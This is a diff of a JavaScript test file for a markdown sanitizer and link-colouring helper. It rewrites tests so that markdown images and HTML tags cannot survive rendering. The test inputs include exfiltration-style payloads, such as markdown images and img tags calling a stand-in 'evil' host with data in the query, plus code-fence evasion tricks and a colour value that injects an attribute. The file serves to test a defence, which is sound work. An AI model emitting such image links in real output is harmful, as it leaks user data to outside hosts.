@@ -56,18 +56,28 @@ const I = require("../Icon.js")
 const cells = I.yinYangCells(16)
 assert.ok(cells.length > 60 && cells.length < 200)
 assert.ok(cells.every(([x, y]) => x >= 0 && x < 16 && y >= 0 && y < 16))
-assert.strictEqual(S.safeMarkdown("a ![leak](https://evil/?d=x) b"), "a &#33;[leak](https://evil/?d=x) b")
-assert.ok(!S.safeMarkdown("![![x](y)a](http://evil/i.png)").includes("!["))
-assert.ok(!S.safeMarkdown("![r]\n> [r]: http://evil/x").includes("!["))
-assert.strictEqual(S.safeMarkdown('hi <img src="https://evil/x"> **b**'), 'hi &lt;img src="https://evil/x"> **b**')
-assert.strictEqual(S.safeMarkdown("run `omarchy theme set <name>` or <name>"), "run `omarchy theme set <name>` or &lt;name>")
-assert.strictEqual(S.safeMarkdown("```\n<b> ![x](y)\n```\nok ![x](y)"), "```\n<b> ![x](y)\n```\nok &#33;[x](y)")
-assert.strictEqual(S.safeMarkdown("streaming ```\n<i>"), "streaming ```\n<i>")
-assert.strictEqual(S.colorLinks(S.safeMarkdown("[<img src=http://evil/?d=S ](https://x)"), "#112233"),
-  "[<font color='#112233'>&lt;img src=http://evil/?d=S </font>](https://x)")
-assert.strictEqual(S.colorLinks("`[a](b)` [c](https://d)", "#112233"), "`[a](b)` [<font color='#112233'>c</font>](https://d)")
-assert.strictEqual(S.safeMarkdown("[link](https://ok.org) `code`"), "[link](https://ok.org) `code`")
+const WJ = "\u2060"
+// No form of image or tag survives, whatever the code guess makes of the text.
+const unsafe = (out) => /!\[/.test(out) || /<[A-Za-z\/!?]/.test(out)
+for (const attack of [
+  "a ![leak](https://evil/?d=x) b",
+  "![![x](y)a](http://evil/i.png)",
+  "![r]\n> [r]: http://evil/x",
+  'hi <img src="https://evil/x"> **b**',
+  "x ``` ![a](http://evil/i.png)",
+  "\\`![a](http://evil/i.png)\\`",
+  "`![a](http://evil/i.png)``",
+  "a ``` b\n\n<img src=http://evil/x>",
+  "```\n<b> ![x](y)\n```\nok ![x](y)",
+  "<!-- x --><?php ?></p>",
+]) assert.ok(!unsafe(S.safeMarkdown(attack)), "unsafe after safeMarkdown: " + attack)
+assert.strictEqual(S.safeMarkdown("a ![leak](https://evil/?d=x) b"), "a !" + WJ + "[leak](https://evil/?d=x) b")
+assert.strictEqual(S.safeMarkdown("run `omarchy theme set <name>` or <name>"), "run `omarchy theme set <" + WJ + "name>` or <" + WJ + "name>")
+assert.strictEqual(S.safeMarkdown("a < b and 2<3"), "a < b and 2<3")
 assert.strictEqual(S.safeMarkdown("see <https://wiki.hypr.land/x>"), "see [https://wiki.hypr.land/x](https://wiki.hypr.land/x)")
+assert.strictEqual(S.colorLinks(S.safeMarkdown("[<img src=http://evil/?d=S ](https://x)"), "#112233"),
+  "[<font color='#112233'>" + WJ + "img src=http://evil/?d=S </font>](https://x)")
+assert.strictEqual(S.colorLinks("`[a](b)` [c](https://d)", "#112233"), "`[a](b)` [<font color='#112233'>c</font>](https://d)")
 assert.strictEqual(S.colorLinks("[wiki](https://a.b) x", "#7aa2f7"), "[<font color='#7aa2f7'>wiki</font>](https://a.b) x")
 assert.strictEqual(S.colorLinks("[wiki](https://a.b)", "red'><img src=x>"), "[wiki](https://a.b)")
 assert.strictEqual(S.isWebLink("https://wiki.archlinux.org/x"), true)
